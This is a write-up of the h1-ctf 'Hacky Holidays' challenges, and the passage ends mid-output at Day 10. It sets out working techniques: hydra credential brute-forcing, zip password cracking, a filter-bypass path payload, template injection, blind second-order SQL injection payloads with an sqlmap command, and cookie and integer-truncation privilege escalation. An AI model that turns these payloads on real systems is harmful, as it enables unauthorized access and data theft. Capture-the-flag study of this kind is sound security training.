# [h1-ctf] 12 Days of Adventure to stop Grinch from ruining Christmas

## Report Details
- **Report ID**: 1067087
- **URL**: https://hackerone.com/reports/1067087
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2020-12-27T17:42:01.055Z
- **Disclosed**: 2021-01-11T21:29:16.422Z

## Reporter
- **Username**: sudi
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: h1-ctf

## Vulnerability Information
---------------------------------------------------------------------------------------------------------------------------------------------------

**Day 1:**

> https://hackyholidays.h1ctf.com/robots.txt

```
User-agent: *
Disallow: /s3cr3t-ar3a
Flag: flag{48104912-28b0-494a-9995-a203d1e261e7}
```

Here we go with the  1st flag `flag{48104912-28b0-494a-9995-a203d1e261e7}`

---------------------------------------------------------------------------------------------------------------------------------------------------

**Day 2:**

From the robots.txt file we were able to find this endpoint, https://hackyholidays.h1ctf.com/s3cr3t-ar3a
This message was shown when visited this endpoint 

*Page Moved*
*I've moved this page to keep people out!*
*If you're allowed access you'll know where to look for the proper page!*

Looking at the page source there wasn't much we can find, there was only this jquery file https://hackyholidays.h1ctf.com/assets/js/jquery.min.js which might lead us to somewhere.

The version was v3.5.1, so I downloaded the same version source file from their website. And tried to see if there is any different in these files or not:

{F1119562}



I checked the sha256 sum of both the files it was different, the no of lines was also different. So I believed I was going right.

Then I used the diff command and was able to find the flag. 

{F1119561}

```html
<div class="alert alert-danger text-center" id="alertbox" data-info="flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}" next-page="/apps">
```
---------------------------------------------------------------------------------------------------------------------------------------------------

**Day 3**

Going to the https://hackyholidays.h1ctf.com/apps, there is an app which says *People rator* there is button upon also clicking on it we are moved to this page https://hackyholidays.h1ctf.com/people-rater

{F1131110}

Where we can see  many *Names* upon clicking on any of the names 
this request is made in the background, it has an id parameter which is having a base64 encoded value

```
GET /people-rater/entry?id=eyJpZCI6Mn0= HTTP/1.1
Host: hackyholidays.h1ctf.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: close
Referer: https://hackyholidays.h1ctf.com/people-rater

```

Response
```
{
  "id": "eyJpZCI6Mn0=",
  "name": "Tea Avery",
  "rating": "Awful"
}
```

An alert is popup with the text saying "Awful" which is the rating for that Name


Decoding:
```
eyJpZCI6Mn0=
{"id":2}
```
SO I tried incrementing this id and sent the request on {"id": 1} in the response I got the flag.

https://hackyholidays.h1ctf.com/people-rater/entry?id=eyJpZCI6MX0=

```json
{
  "id": "eyJpZCI6MX0=",
  "name": "The Grinch",
  "rating": "Amazing in every possible way!",
  "flag": "flag{b705fb11-fb55-442f-847f-0931be82ed9a}"
}

```

3rd flag done: `flag{b705fb11-fb55-442f-847f-0931be82ed9a}`

---------------------------------------------------------------------------------------------------------------------------------------------------

**Day 4**

This time  a new Swag shop was added and our task was *"Get your Grinch Merch! Try and find a way to pull the Grinch's personal details from the online shop."*
 https://hackyholidays.h1ctf.com/swag-shop

{F1131112}

The shop has 3 items if we try to purchase any of them it will ask us to provide credentials which we dont have access to.
Looking at the burp history tab, we can see some reuqets has been made under the api endpoint.

https://hackyholidays.h1ctf.com/swag-shop/api/purchase
https://hackyholidays.h1ctf.com/swag-shop/api/login

The same we can find them from the source:

```javascript
$.getJSON("/swag-shop/api/stock")

$.post("/swag-shop/api/purchase", {
            id: $(this).attr("data-product-id")
        }
```

After doing some content discovery I found two more endpoints /user, /sessions
The user endpoint was showig an error in the response "Missing required fields", so I used Arjun tool to bruteforce parameters for this endpoint. 

`uuid` was the valid parameter which came up in the results:

https://hackyholidays.h1ctf.com/swag-shop/api/user?uuid=

The response to this endpoint was: *"Could not find matching uuid"*, so we need to pass an valid uuid here.Looking at the 2nd endpoint /sessions, the reponse was containing jwt tokens there were around 8 of them.

https://hackyholidays.h1ctf.com/swag-shop/api/sessions

```json
{
  "sessions": [
    "eyJ1c2VyIjpudWxsLCJjb29raWUiOiJZelZtTlRKaVlUTmtPV0ZsWVRZMllqQTFaVFkxTkRCbE5tSTBZbVpqTW1ObVpHWXpNemcxTVdKa1pEY3lNelkwWlRGbFlqZG1ORFkzTkRrek56SXdNR05pWmpOaE1qUTNZMlJtWTJFMk4yRm1NemRqTTJJMFpXTmxaVFZrTTJWa056VTNNVFV3WWpka1l6a3lOV0k0WTJJM1pXWmlOamsyTjJOak9UazBNalU9In0=",
    "eyJ1c2VyIjpudWxsLCJjb29raWUiOiJaak0yTXpOak0ySmtaR1V5TXpWbU1tWTJaamN4TmpkbE5ETm1aalF3WlRsbVkyUmhOall4TldNNVkyWTFaalkyT0RVM05qa3hNVFEyTnprMFptSXhPV1poTjJaaFpqZzBZMkU1TnprMU5UUTJNek16WlRjME1XSmxNelZoWkRBME1EVXdZbVEzTkRsbVpURTRNbU5rTWpNeE16VTBNV1JsTVRKaE5XWXpPR1E9In0=",
    "eyJ1c2VyIjoiQzdEQ0NFLTBFMERBQi1CMjAyMjYtRkM5MkVBLTFCOTA0MyIsImNvb2tpZSI6Ik5EVTBPREk1TW1ZM1pEWTJNalJpTVdFME1tWTNOR1F4TVdFME9ETXhNemcyTUdFMVlXUmhNVGMwWWpoa1lXRTNNelUxTWpaak5EZzVNRFEyWTJKaFlqWTNZVEZoWTJRM1lqQm1ZVGs0TjJRNVpXUTVNV1E1T1dGa05XRTJNakl5Wm1aak16WmpNRFEzT0RrNVptSTRaalpqT1dVME9HSmhNakl3Tm1Wa01UWT0ifQ==",
    "eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNRFJtWVRCaE4yRmlOalk1TUdGbE9XRm1ZVEU0WmpFMk4ySmpabVl6WldKa09UUmxPR1l3TWpJMU9HSXlOak0xT0RVME5qYzJZVGRsWlRNNE16RmlNMkkxTVRVek16VmlNakZoWXpWa01UYzRPREUzT0dNNFkySmxPVGs0TWpKbE1ESTJZalF6WkRReE1HTm1OVGcxT0RReFpqQm1PREJtWldReFptRTFZbUU9In0=",
    "eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNMlEyTURJek5EZzVNV0UwTjJNM05ESm1OVEl5TkdNM05XVXhZV1EwTkRSbFpXSTNNVGc0TWpJM1pHUmtNVGxsWlRNMlpEa3hNR1ZsTldFd05tWmlaV0ZrWmpaaE9EZzRNRFkzT0RsbVpHUmhZVE0xWTJJeU1HVmhNakExTmpkaU5ERmpZekJoTVdRNE5EVTFNRGM0TkRFMVltSTVZVEpqT0RCa01qRm1OMlk9In0=",
    "eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNV1kzTVRBek1UQmpaR1k0WkdNd1lqSTNaamsyWm1Zek1XSmxNV0V5WlRnMVl6RTBNbVpsWmpNd1ltSmpabVE0WlRVMFkyWXhZelZtWlRNMU4yUTFPRFkyWWpGa1ptRmlObUk1WmpJMU0yTTJNRFZpTmpBMFpqRmpORFZrTlRRNE4yVTJPRGRpTlRKbE1tRmlNVEV4T0RBNE1qVTJNemt4WldOaE5qRmtObVU9In0=",
    "eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNRE00WXpoaU4yUTNNbVkwWWpVMk0yRmtabUZsTkRNd01USTVNakV5T0RobE5HRmtNbUk1T1RjeU1EbGtOVEpoWlRjNFlqVXhaakl6TjJRNE5tUmpOamcyTm1VMU16VmxPV0V6T1RFNU5XWXlPVGN3Tm1KbFpESXlORGd5TVRBNVpEQTFPVGxpTVRZeU5EY3pOakZrWm1VME1UZ3hZV0V3TURVMVpXTmhOelE9In0=",
    "eyJ1c2VyIjpudWxsLCJjb29raWUiOiJPR0kzTjJFeE9HVmpOek0xWldWbU5UazJaak5rWmpJd00yWmpZemRqTVdOaE9EZzRORGhoT0RSbU5qSTBORFJqWlRkbFpUZzBaVFV3TnpabVpEZGtZVEpqTjJJeU9EWTVZamN4Wm1JNVpHUmlZVGd6WmpoaVpEVmlPV1pqTVRWbFpEZ3pNVEJrTnpObU9ESTBPVE01WkRNM1kySmpabVk0TnpFeU9HRTNOVE09In0="
  ]
}
```


Upon decoding them they all had these  similar format, user, cookie:

```json
{
  "user": null,
  "cookie": "YzVmNTJiYTNkOWFlYTY2YjA1ZTY1NDBlNmI0YmZjMmNmZGYzMzg1MWJkZDcyMzY0ZTFlYjdmNDY3NDkzNzIwMGNiZjNhMjQ3Y2RmY2E2N2FmMzdjM2I0ZWNlZTVkM2VkNzU3MTUwYjdkYzkyNWI4Y2I3ZWZiNjk2N2NjOTk0MjU="
}
```

If we try to decode the base64 cookie value, we will get long hex value. which doesn't make any sense.I tried passsing this tokens in cookies hoping that these are the user session token.
I was adding them in the token parameter of Cookie header, I found this cookie parameter from the source js code.

```js
document.cookie("token=" + o.token), window.location = "/swag-shop"
```

But nothing worked, one of the jwt token length was really long which was suspicious. I decoded it and found

eyJ1c2VyIjoiQzdEQ0NFLTBFMERBQi1CMjAyMjYtRkM5MkVBLTFCOTA0MyIsImNvb2tpZSI6Ik5EVTBPREk1TW1ZM1pEWTJNalJpTVdFME1tWTNOR1F4TVdFME9ETXhNemcyTUdFMVlXUmhNVGMwWWpoa1lXRTNNelUxTWpaak5EZzVNRFEyWTJKaFlqWTNZVEZoWTJRM1lqQm1ZVGs0TjJRNVpXUTVNV1E1T1dGa05XRTJNakl5Wm1aak16WmpNRFEzT0RrNVptSTRaalpqT1dVME9HSmhNakl3Tm1Wa01UWT0ifQ==


```json
{
  "user": "C7DCCE-0E0DAB-B20226-FC92EA-1B9043",
  "cookie": "NDU0ODI5MmY3ZDY2MjRiMWE0MmY3NGQxMWE0ODMxMzg2MGE1YWRhMTc0YjhkYWE3MzU1MjZjNDg5MDQ2Y2JhYjY3YTFhY2Q3YjBmYTk4N2Q5ZWQ5MWQ5OWFkNWE2MjIyZmZjMzZjMDQ3ODk5ZmI4ZjZjOWU0OGJhMjIwNmVkMTY="
}
``` 

The user key value looks like an uuid, C7DCCE-0E0DAB-B20226-FC92EA-1B9043. So I used it in the uuid parameter.

https://hackyholidays.h1ctf.com/swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043

Response:

```
{
  "uuid": "C7DCCE-0E0DAB-B20226-FC92EA-1B9043",
  "username": "grinch",
  "address": {
    "line_1": "The Grinch",
    "line_2": "The Cave",
    "line_3": "Mount Crumpit",
    "line_4": "Whoville"
  },
  "flag": "flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}"
}
```

In this way I was able to get the 4th flag: `flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}`


---------------------------------------------------------------------------------------------------------------------------------------------------

**Day 5:**

Our today's goal is to : *"Try and find a way past the login page to get to the secret area."*

**Url:** https://hackyholidays.h1ctf.com/secure-login


I started by looking at the source page, but there wasn't any js code this time. So then I started trying some default creds like grinch:admin, admin:password ,etc they didn't worked. Then I tried for sqli that also didn't worked there was no difference in the response upon inputting a single quote in the username & password field.


The error mssg which was shown when we provided the wrong creds was : *Invalid Username*
Here we might be able to guess the correct username, as the application might give an error like *Invalid Password* upon providing a valid username.

I used hydra tool for this purpose: (wordlist was taken from seclist)

**Enumerating valid username:**

>hydra -L 10k-most-common.txt -p "sudi"  hackyholidays.h1ctf.com  https-post-form "/secure-login:username=^USER^&password=^PASS^:Invalid Username"

Output: valid username found *access*

{F1119482}


**Enumerating valid password:**

>hydra -P 10k-most-common.txt -l "access"  hackyholidays.h1ctf.com  https-post-form "/secure-login:username=^USER^&password=^PASS^:Invalid Password"

Output: valid password found for username *access*: computer
{F1119483}

Let's get login to the website `access:computer`
After getting login, we get the following page
 
{F1119497}

No flag ahh, need to dig a little more. The cookie seemed interesting so I decoded it

```json
eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjpmYWxzZX0=

{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":false}
```
 You already know what we are going to do now :), changing false to true, base64 encode it again and  replace the old cookie with this cookie which has admin set to *true*

Reload the page and it worked, now we can see something has changed.
{F1119498} 

Dowloaded this zip file: https://hackyholidays.h1ctf.com/my_secure_files_not_for_you.zip, this zip file is password protected so again we need to bruteforce the password.

I used a tool called fcrackzip to crack the password for this zip file , I used the same wordlist as I used earlier to bruteforce the username and password.


>➜  /tmp fcrackzip -u -D -p '10k-most-common.txt' my_secure_files_not_for_you.zip                 

And the password was : `hahahaha`          
We got two files one was flag.txt which obviously had the flag and another was xxx.png image which was wierd..... really  wierd.....
For the viewers, here it is:
{F1119558}

Today all the tasks were related to bruteforce only.

5th flag done: `flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}`

---------------------------------------------------------------------------------------------------------------------------------------------------

**Day 6:**

Damn today's challenge was pretty nice, had a hard time figuring out how to get the flag.

Our Day6 goal was to:  *"Hackers! It looks like the Grinch has released his Diary on Grinch Networks. We know he has an upcoming event but he hasn't posted it on his calendar. Can you hack his diary and find out what it is?"*

We need to hack into grinch diary's!!

Upon opening the challenge page https://hackyholidays.h1ctf.com/my-diary we are redirected to this endpoint https://hackyholidays.h1ctf.com/my-diary/?template=entries.html

In this screenshot you could see the Grinch's Diary
{F1131118}


I started with replacing the template parameter value as it might be vulnerable to lfi attack, replacing it to index.html didn't worked so I tried index.php and in the source page I was able to get the index.php source code.

https://hackyholidays.h1ctf.com/my-diary/?template=index.php

```php
<?php
if( isset($_GET["template"])  ){
    $page = $_GET["template"];
    //remove non allowed characters
    $page = preg_replace('/([^a-zA-Z0-9.])/','',$page);
    //protect admin.php from being read
    $page = str_replace("admin.php","",$page);
    //I've changed the admin file to secretadmin.php for more security!
    $page = str_replace("secretadmin.php","",$page);
    //check file exists
    if( file_exists($page) ){
       echo file_get_contents($page);
    }else{
        //redirect to home
        header("Location: /my-diary/?template=entries.html");
        exit();
    }
}else{
    //redirect to home
    header("Location: /my-diary/?template=entries.html");
    exit();
}
```

Behind the scenes the provided filename existed on the server then the content of the file was shown back to the user with the *file_get_contents* function, if the application was using *include* Statement instead of file_get_contents then we would have chance of hoping to get an rce if somehow we can control the contents of the file.

Moving on to the comments , so we need to look at the secretadmin.php file as admin.php has been removed *for more security* :)

Changing the value to `?template=secretadmin.php`
Redirects us to the /my-diary/?template=entries.html endpoint again ,due to the use of str_replace function on our input it stripping words from our input for eg:

```php
$page = str_replace("admin.php","",$page);
$page = str_replace("secretadmin.php","",$page);
```

The $page parameter contains our input, for eg: if we input something like: secretadmin.php
After the first line execution $page will equal to "secret", "admin.php" part will be replaced with ""
2nd line replaces any occurence of "secretadmin.php" to "".

Also one thing to note is that str_replace is used two times here and it's not done in a recursive way which might cause some issues.

Our end goal is to provide an input like that which even after the replacements still comes out as secretadmin.php.
For eg: secretadminsecretadminadmin.php.php.php

```php
$page = str_replace("admin.php","","secretadminsecretadminadmin.php.php.php");
//=> secretadminsecretadmin.php.php 
```

secretadminsecretadmin{admin.php}.php.php
The part inside {} was replaced with "" so we end up with  secretadminsecretadmin.php.php

Now the 2nd replace function will be called

```php
$page = str_replace("secretadmin.php","","secretadminsecretadmin.php.php");
// => secretadmin.php 
```

secretadmin{secretadmin.php}.php
The part inside {} was replaced with "" so we end up with  secretadmin.php 

Pretty sweet!!

https://hackyholidays.h1ctf.com/my-diary/?template=secretadminsecretadminadmin.php.php.php

And we got the flag :)

One more interesting thing I could have tried accessing the secretadmin.php directly by visiting this url: https://hackyholidays.h1ctf.com/my-diary/secretadmin.php

But this error was shown:

```
You cannot view this page from your IP Address
```

I tried to bypass this by using serveral X-* headers like X-Forwarded-For: 127.0.0.1 but none of them worked.

The reason for this was this:

```php
$_SERVER["REMOTE_ADDR"] == '127.0.0.1'
```
If the application was using this code, then we would have been able to get the flag by adding the header itself: 

```php
$_SERVER['HTTP_X_FORWARDED_FOR']
```


6th flag done: `flag{18b130a7-3a79-4c70-b73b-7f23fa95d395}`

---------------------------------------------------------------------------------------------------------------------------------------------------

**Day 7**

Our Today task was: *Sending letters is so slow! Now the grinch sends his hate mail by email campaigns! Try and find the hidden flag!*

We can visit the challenege at this page: https://hackyholidays.h1ctf.com/hate-mail-generator/, on this page a campaign already running *Guess What* , looking more into https://hackyholidays.h1ctf.com/hate-mail-generator/91d45040151b681549d82d8065d43030

Here in this markup field you can see they are using templates:

{F1131661}

As there is option to create new campaigns let see it first, when we click on the *Generate* button we get this error 

*Sorry but you've run out of credits*

So we might be not able to create any campaign but we can preview our email message by clicking on the *Preview button*
This request is made when we click on the *Preview* button


```
POST /hate-mail-generator/new/preview HTTP/1.1
Host: hackyholidays.h1ctf.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 90
Origin: https://hackyholidays.h1ctf.com
Connection: close
Referer: https://hackyholidays.h1ctf.com/hate-mail-generator/new
Upgrade-Insecure-Requests: 1

preview_markup=Hi,{{name}}&preview_data={"name":"Shirley","email":"alice@test.com"}
```

Response:

```
Hi,Shirley
```

I tried adding something like {{7*7}} in the  preview_markup parameter but in the response.we get this error mssg "Missing key 7*7 in dataset"

Looking again at the grifin campaigns:

```
{{template:cbdj3_grinch_header.html}} Hi {{name}}..... Guess what..... <strong>YOU SUCK!</strong>{{template:cbdj3_grinch_footer.html}}
```

{{template:cbdj3_grinch_header.html} this looks interesting as it's taking a filename as the input. So I added the same thing in the preview_markup parameter and also made  a little change nin the filename.

Due to which this error was shown:

*Cannot find template file /templates/cbdj3_grinch_headers.html*

From this error we got an directory name, let's try to access it https://hackyholidays.h1ctf.com/hate-mail-generator/templates/
Directory listing is enabled here which gives us the name of one more html file *38dhs_admins_only_header.html*

Trying to access this file directly gives us 403 forbidden error.
I added to the template : {{template:38dhs_admins_only_header.html}} 

Response: *You do not have access to the file 38dhs_admins_only_header.html*

AS we saw earlier in the sample template file:

```
preview_markup= Hi, {{name}}
preview_data=  {"name":"Shirley","email":"alice@test.com"}

Output: Hi Shirley
Here it took the name key vaue which we provided in the 2nd parameter.
```
What would happen if I try something like this:

```
preview_markup= {{file}}
preview_data=  {"file":"{{template:38dhs_admins_only_header.html}}"}
```

And it worked suprisingly, in the response I got the flag :)


7th flag done: `flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}`

---------------------------------------------------------------------------------------------------------------------------------------------------

**Day 8**

Our today task was: *"The Grinch thought it might be a good idea to start a forum but nobody really wants to chat to him. He keeps his best posts in the Admin section but you'll need a valid login to access that!"*

Get access to the Admin section of the forum. Let's start ,this one was really hard.
Challenge was accessible at this endpoint: https://hackyholidays.h1ctf.com/forum

{F1131120}

Here we can see three posts have been made 

1. Why I hate Christmas (By grinch)
2. Nice Things To Do (which is empty no comments)
3. Admin Section (which can only be viewed by the Admin)

From the first post we can see the comments made by two users which are *grinch* and *max*.
There is a login panel for the forum: https://hackyholidays.h1ctf.com/forum/login

But we are not provided with any creds ,although we some potential valid usernames which we found from a post. I tried using hydra to see if it's possible to do the same like we did in an earlier challenege.
But no valid creds were found for both users.

The forum posts had path like this: 

```
https://hackyholidays.h1ctf.com/forum/2
https://hackyholidays.h1ctf.com/forum/1
https://hackyholidays.h1ctf.com/forum/1/1
```

So I decided to see if I can find any other post by incrementing the numbers: /forum/FUZZ and for /forum/1/FUZZ (from 0 to 1337), but no results  were found. Then I moved to content discovery.

>ffuf -w -u https://hackyholidays.h1ctf.com/forum/FUZZ

I was able to find another valid endpoint: /phpmyadmin, I tried defaults creds for this but they also didn't worked.
As everything seemed like a dead end, github recon might be come in use at this place.

Well as we know the author of this ctf challenges is Adam Langley, lets check his github profile.

https://github.com/adamtlangley

You can see in this contribution section: Grinch-Networks/forum

{F1131121}

Is our target now: https://github.com/Grinch-Networks/forum
The most interesting file here  is the DB.php here: https://github.com/Grinch-Networks/forum/blob/main/models/Db.php, as it has keywords like user,pass but I couldn't find any creds from here. I then checked the commit history and found one with the commit message "small fix"

https://github.com/Grinch-Networks/forum/commit/efb92ef3f561a957caad68fca2d6f8466c4d04ae

{F1131122}

This is what we were looking for: forum:6HgeAZ0qC9T6CQIqJpD (user:pass)
I then went to the login portal, at first tried this creds in the forum login it didn't worked, then on the phpmyadmin it worked :)

From here I was able to find the username and md5 password hash.
I went to crackstation.net, found the plaintext password: BahHumbug for the user grinch.

Was able to then successfully login into the forum login, and from there found the flag.


8th flag done: `flag{677db3a0-f9e9-4e7e-9ad7-a9f23e47db8b}`


---------------------------------------------------------------------------------------------------------------------------------------------------

**Day 9:**

Our today's task was: *Just how evil are you? Take the quiz and see! Just don't go poking around the admin area!*

Let's take the quiz and see what else is there.
The challenge url is: https://hackyholidays.h1ctf.com/evil-quiz/

Before starting the quiz we have to provide our name, let's enter "test" and continue, on the next page we have to give answer for 3 questions, click on finish button and then you will be on the score page.

{F1131124}

As I saw our provided name was reflecting on the score page, I tried for xss . There was also an admin login page so I was thing there might a bxss vulnerability. But later I found that xss is not possible here.

I started the quiz again this time use this payload as the name: test'  (single quote to check for sqli), nothing happend there. But on the score page I could see something was strange.

Input:

```
name: test
There is 7 other player(s) with the same name as you!

name: test'
There is 0 other player(s) with the same name as you!


``` 
I realised this might be a second order sql injection (as there wasn't any change in the response on the page where we provided our input but later on a different page we could see that the response has some changes).
Then I tried with some more payloads(to fix the query ):

```

name: test''
There is 0 other player(s) with the same name as you!

name: test'--
There is 0 other player(s) with the same name as you!

name: test'--+
There is 0 other player(s) with the same name as you!

name: test'#
There is 6 other player(s) with the same name as you!
```

So by using # (it is used as a commnet in mysql), I was able to fix the query.
To confirm sqli was there, I tried 

test' and 1=2# //Returns false so 0 players matched
test' and 1=1# //Returns true so 6 players matched


From this blog , https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap/second-order-injection-sqlmap , we could see that we can use sqlmap to exploit this 2nd order sqli.

```bash
sqlmap -u "https://hackyholidays.h1ctf.com/evil-quiz"  --data "name=test" -p "name" --method POST --second-url "https://hackyholidays.h1ctf.com/evil-quiz/score" --cookie="session=TokenHere"
```

But sqlmap didn't worked for me, so I moved try to do the sqli manually.
I started with using order by clause and found there are 4 columns in the table, but I was not able find the vulnerable column so I left the union based way.

```
test' order by 4#
test' union select 1,2,3,4#

```

Character by character I first exracted the table name:

```
test' and Ascii(substring((Select+concat(table_name)from+information_schema.tables+where+table_schema=database()+limit+0,1),1,1))=0#

Result:
admin
```

Then extracted the column_name

```
name=admin' and Ascii(substring((Select+concat(column_name)+from+information_schema.columns+where+table_name=0x61646d696e+limit+0,1),1,1))=0#

Result: found 3 columns under admin table
id, username, password

```

Then getting the password took too much time as it was having special characters and numbers in it too.

```
test' and Ascii(substr((select+concat(password)+from+admin+limit+0,1),1,1))=83#

Result:
S3creT_p4ssw0rd-$

```

took a wild guess for the username "admin", tried this creds in the login panel and they worked.

Used this creds `admin:S3creT_p4ssw0rd-$`  here https://hackyholidays.h1ctf.com/evil-quiz and got the flag.


9th flag is here: ` flag{6e8a2df4-5b14-400f-a85a-08a260b59135}`


------------------------------------------------------------------------------------------------------------------------------------------------

**Day 10**

The challenges description says : *You've made it this far! The grinch is recruiting for his army to ruin the holidays but they're very picky on who they let in!*

Challenge url:https://hackyholidays.h1ctf.com/signup-manager/

We have login form on the left side of the page and a signup form on the right.

{F1131125}

Filling the signup form details , then upon login into the site we get the following message : *We'll have a look into you and see if you're evil enough to join the grinch army!*

Age field has a drop down in which we can choose age from 1 to 100+ (probably something migt be there)

Coming back at the challenge url and checking the source we can see a html comment: <!-- See README.md for assistance -->

https://hackyholidays.h1ctf.com/signup-manager/README.md

```

# SignUp Manager

SignUp manager is a simple and easy to use script which allows new users to signup and login to a private page. All users are stored in a file so need for a complicated database setup.

### How to Install

1) Create a directory that you wish SignUp Manager to be installed into

2) Move signupmanager.zip into the new directory and unzip it.

3) For security move users.txt into a directory that cannot be read from website visitors

4) Update index.php with the location of your users.txt file

5) Edit the user and admin php files to display your hidden content

6) You can make anyone an admin by changing the last character in the users.txt file to a Y

7) Default login is admin / password
```

Tried the default login to see if I can get any more information or not, but I got the same response as I got before.

Did some content discovery using ffuf found this endpoint:

```
README.md
admin.php
user.php
```

When I tried to access the admin.php,user.php endpoint the following error is shown *You cannot access this page directly*
After some time I read the README.md file again this time with more attention , I didn't tried this endpoint /signupmanager.zip I realised.

https://hackyholidays.h1ctf.com/signup-manager/signupmanager.zip, unzip the zip file and now I have access to all the source code :)
I also check whether I can find the user.txt , but couldn't find it at this url https://hackyholidays.h1ctf.com/signup-manager/user.txt

When I saw this line of code in the index.php (use of substr), I thought Truncation vulnerability might be there which will allow me to re register again with an username which is having admin priveleges.

```php
$username = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["username"]), 0, 15);
```

But I was wrong I realised it later, due to the use of preg_replace, if there is anything other than alphabets, numbers in the username it will get replace with ''.

Looking more into the code and getting an understanding of it I undertood what I needed  to do.

After we had provided the inputs like username,password,age,lastname,firstname . The  addUser function is called and this values are passed along with it, this function is only called when there is no error. If there is any error like Username already exists,etc then it will display the error to the user.

```php
$cookie = addUser($username, $password, $age, $firstname, $lastname);

```

addUser function:

```php
function addUser($username,$password,$age,$firstname,$lastname){
    $random_hash = md5( print_r($_SERVER,true).print_r($_POST,true).date("U").microtime().rand() );
    $line = '';
    $line .= str_pad( $username,15,"#");
    $line .= $password;
    $line .= $random_hash;
    $line .= str_pad( $age,3,"#");
    $line .= str_pad( $firstname,15,"#");
    $line .= str_pad( $lastname,15,"#");
    $line .= 'N';
    $line = substr($line,0,113);
    file_put_contents('users.txt',$line.PHP_EOL, FILE_APPEND);
    return $random_hash;
}
```

Contents of user.txt after this function is called.

```
username#######5f4dcc3b5aa765d61d8327deb882cf99a352e06df699483aa1d6c05a5ab66a05100firstname######lastname#######N 

```
The length of this long string is truncated to 113, as you can see here $line = substr($line,0,113);
This is responsible for differentiating a normal user and a admin user: $line .= 'N';

In that long string you can see 'N' is there at the last which means not ADMIN, if there was Y it means ADMIN user.

The idea which came in my mind was, if I can provide a larger length value for one of the inputs and increase the length of the $line variable to something more than 113, so when this line is executed substr($line,0,113) it will also remove 'N' from the last. 

15 (username) + 32 (randomhash) + 32 (password) + 3 (age) + 15 (firstname) + 15 (lastname) + 1 (admin Y/N)= 113 

randomhash and password are md5 hashes no matter how long password I provide it's length is going to be 32 only.
Username,firstname,lastname all have same length

```php
$username =  substr(preg_replace('/([^a-zA-Z0-9])/', '', $username), 0, 15);
$firstname = substr(preg_replace('/([^a-zA-Z0-9])/', '', $firstname), 0, 15);
$lastname =  substr(preg_replace('/([^a-zA-Z0-9])/', '', $lastname), 0, 15);
```

Only the $age variable seems interesting target for us:

```php
if (!is_numeric($_POST["age"])) {

    $errors[] = 'Age entered is invalid';
}

if (strlen($_POST["age"]) > 3) {

    $errors[] = 'Age entered is too long';
}

$age = intval($_POST["age"]);

```

Lookin at the intval functions docs https://www.php.net/manual/en/function.intval.php
*It gets the integer value of the variable*

In the eg codes: 

```php
echo intval(1e10);                    // 1410065408
```

This looked very interesting, the provided exponent number length was only 4 , but what was assign to the variable was 1410065408 whose length is 10. This is what we are looking for.

I used this php code to test locally whether it will work or not:

1e9 = 1000000000

```php


<?php

function isAdmin(){
    $users_txt = file_get_contents('users.txt');
    foreach( explode(PHP_EOL,$users_txt) as $user_str ){
        if( strlen($user_str) == 113 ){
            $username = str_replace('#', '', substr($user_str, 0, 15));
            $users = array(
                'username' => $username,
                'password' => str_replace('#', '', substr($user_str, 15, 32)),
                'cookie' => str_replace('#', '', substr($user_str, 47, 32)),
                'age' => intval(str_replace('#', '', substr($user_str, 79, 3))),
                'firstname' => str_replace('#', '', substr($user_str, 82, 15)),
                'lastname' => str_replace('#', '', substr($user_str, 97, 15)),
                'admin' => ((substr($user_str, 112, 1) === 'Y') ? true : false)
            );
            echo $users['admin'];
            if (substr($user_str, 112, 1) === 'Y'){
                echo "\nYou are admin here is your flag{xxxxxxxx}";
            }
        }
    }
}

function addUser($username,$password,$age,$firstname,$lastname){
    $random_hash = md5( print_r($_SERVER,true).print_r($_POST,true).date("U").microtime().rand() );
    $line = '';
    $line .= str_pad( $username,15,"#");
    $line .= $password;
    $line .= $random_hash;
    $line .= str_pad( $age,3,"#");
    $line .= str_pad( $firstname,15,"#");
    $line .= str_pad( $lastname,15,"#");
    $line .= 'N';
    echo "Here is the line before substr 113\n";
    echo $line;

    $line = substr($line,0,113);
    echo "\nHere is the line after substr 113\n";
    echo $line;
    file_put_contents('users.txt',$line.PHP_EOL, FILE_APPEND);
    echo "\nWritten successfully to user.txt\n";
}



$username = 'test';
$password = md5('test');
$age = '1e9';
$firstname = 'aaaaaaaaaaaaaa';
$lastname = 'setiaaaaY';  //notice the Y at the last

$username =  substr(preg_replace('/([^a-zA-Z0-9])/', '', $username), 0, 15);
$firstname = substr(preg_replace('/([^a-zA-Z0-9])/', '', $firstname), 0, 15);
$lastname =  substr(preg_replace('/([^a-zA-Z0-9])/', '', $lastname), 0, 15);

if (!is_numeric($age)) {
    echo 'Age entered is invalid<br/>';
}

if (strlen($age) > 3) {
    echo  'Age entered is too long<br/>';
}

$age = intval($age);

addUser($username, $password, $age, $firstname, $lastname);

isAdmin();



?>

```

Output:

```
Here is the line variable value before substr($line,0,113)
test###########098f6bcd4621d373cade4e832627b4f6959ea94b27710517247388bd0bfcb36c1000000000aaaaaaaaaaaaaa#setiaaaaY######N

Here is the line variable value after substr($line,0,113)
